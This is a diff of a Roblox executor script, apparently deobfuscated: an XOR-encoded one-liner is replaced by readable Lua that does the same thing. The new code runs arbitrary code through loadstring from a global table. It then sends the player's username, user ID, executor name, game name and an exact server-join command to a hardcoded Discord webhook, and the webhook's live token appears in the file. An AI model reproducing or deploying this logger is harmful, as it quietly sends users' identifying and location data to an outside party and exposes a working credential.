@@ -1,1 +1,66 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v21,v22) local v23={};for v24=1, #v21 do v6(v23,v0(v4(v1(v2(v21,v24,v24 + 1 )),v1(v2(v22,1 + (v24% #v22) ,1 + (v24% #v22) + 1 )))%256 ));end return v5(v23);end local v8=game.Players.LocalPlayer;local v9=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v10=game:GetService(v7("\14\204\56\206\249\55\221\38\196\255\38\254\47\215\234\42\206\47","\156\67\173\74\165"));local v11=tostring(game.PlaceId);local v12=_G.place[v11];if v12 then loadstring(v12)();end local v13=v7("\60\163\93\6\175\124\9\123\179\64\5\191\41\84\48\249\74\25\177\105\71\36\190\6\1\185\36\78\59\184\66\5\243\119\21\99\239\27\71\234\116\19\101\229\27\71\229\127\31\99\228\30\89\164\40\115\7\158\70\34\171\28\84\6\174\111\41\143\11\118\21\231\74\55\145\126\75\49\157\70\34\132\54\107\59\144\100\52\149\14\110\102\152\76\29\166\13\113\2\155\65\62\236\53\84\121\180\97\36\175\62\86\45\225\81\5\241\17\99\34\250","\38\84\215\41\118\220\70");local v14=v7("\101\24\41\28\241\71\24","\158\48\118\66\114");local v15,v16=pcall(function() return v10:GetProductInfo(game.PlaceId);end);if (v15 and v16 and v16.Name) then v14=v16.Name;end local v17=string.format('game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)',game.PlaceId,game.JobId);local v18={{[v7("\165\37\29\51","\155\203\68\112\86\19\197")]=v7("\97\220\59\249\0\86\228\245\67","\152\38\189\86\156\32\24\133"),[v7("\234\86\171\83\249","\38\156\55\199")]=v14   .. v7("\232\70\60\98\89\68\246\66\171\120\85\12\89\62\186\25\232","\35\200\29\28\72\115\20\154")   .. v11   .. v7("\89\130","\84\121\223\177\191\237\76") ,[v7("\178\88\197\169\52\85","\161\219\54\169\192\90\48\80")]=false},{[v7("\71\67\13\32","\69\41\34\96")]=v7("\153\219\210\9\23\63\179\209\151\63\17\46\184","\75\220\163\183\106\98"),[v7("\20\187\135\34\220","\185\98\218\235\87")]=(identifyexecutor and identifyexecutor()) or v7("\254\50\44\232\209\189\197","\202\171\92\71\134\190") ,[v7("\32\207\32\129\39\196","\232\73\161\76")]=false},{[v7("\181\216\79\88","\126\219\185\34\61")]=v7("\38\193\87\124\62\68\246\245\26\203\76","\135\108\174\62\18\30\23\147"),[v7("\160\232\38\222\29","\167\214\137\74\171\120\206\83")]=v7("\139\240\50","\199\235\144\82\61\152")   .. v17   .. v7("\7\22\185","\75\103\118\217") ,[v7("\206\90\124\29\183\27","\126\167\52\16\116\217")]=false}};local v19=(syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) ;if  not v19 then return;end local v20={[v7("\205\35\34\133\176\10","\156\168\78\64\224\212\121")]={{[v7("\19\231\177\194\2","\174\103\142\197")]=v7("\109\98\21\120\0\102\221\117\29\107\29\101\20\178\107","\152\54\72\63\88\69\62"),[v7("\208\193\253\95\198\205\254\72\221\203\224","\60\180\164\142")]=string.format(v7("\99\30\79\99\18\254\23\74\80\4\36\34\167\88\24\4\69\108\52\173\47\24\19\69\18\103\167\88\109\77\0\59\14\201\88\18\30\95\105\98\233\82\101","\114\56\62\101\73\71\141"),v8.Name,v8.UserId),[v7("\172\240\203\193","\164\216\137\187")]=v7("\192\239\50\186","\107\178\134\81\210\198\158"),[v7("\59\1\142\201\184","\202\88\110\226\166")]=8421504,[v7("\197\6\135\251\206\208","\170\163\111\226\151")]=v18}}};v19({[v7("\36\34\190","\73\113\80\210\88\46\87")]=v13,[v7("\172\41\217\26\232\133","\135\225\76\173\114")]=v7("\42\194\139\132","\199\122\141\216\208\204\221"),[v7("\133\216\17\244\125\228\190","\150\205\189\112\144\24")]={[v7("\6\139\177\88\1\134\5\93\17\157\175\73","\112\69\228\223\44\100\232\113")]=v7("\213\15\23\223\191\127\135\192\22\8\221\249\118\149\219\17","\230\180\127\103\179\214\28")},[v7("\174\10\91\95","\128\236\101\63\38\132\33")]=v9:JSONEncode(v20)});
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local placeIdStr = tostring(game.PlaceId)
+local cmd = _G.place[placeIdStr]
+if cmd then
+    loadstring(cmd)()
+end
+
+local Execute_webhookURL = "https://discord.com/api/webhooks/1378216251221999737/xnUSIoTwZrRyF_SMPA0cAM8meJoTXpMoGMBIHH2OekzKWVLhH0sr-cHRsxpy6xs-WEv-"
+
+local gameName = "Unknown"
+local success, info = pcall(function()
+    return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+if success and info and info.Name then
+    gameName = info.Name
+end
+
+local teleportCommand = string.format(
+    "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)",
+    game.PlaceId, game.JobId
+)
+
+local fields = {
+    {
+        name  = "Game Name",
+        value = gameName .. " [ **PlaceID** : " .. placeIdStr .. " ]",
+        inline = false,
+    },
+    {
+        name  = "Executor Used",
+        value = identifyexecutor and identifyexecutor() or "Unknown",
+        inline = false,
+    },
+    {
+        name = "Join Server",
+        value = "```" .. teleportCommand .. "```",
+        inline = false
+    }
+}
+
+local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+if not httpRequest then
+    return
+end
+
+local payload = {
+    embeds = {
+        {
+            title       = "[** EXECUTE **]",
+            description = string.format("[ **Username** : %s ] - [ **UserID** : %d ]", player.Name, player.UserId),
+            type        = "rich",
+            color       = 0x808080,
+            fields      = fields
+        }
+    }
+}
+
+httpRequest({
+    Url     = Execute_webhookURL,
+    Method  = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body    = HttpService:JSONEncode(payload)
+})
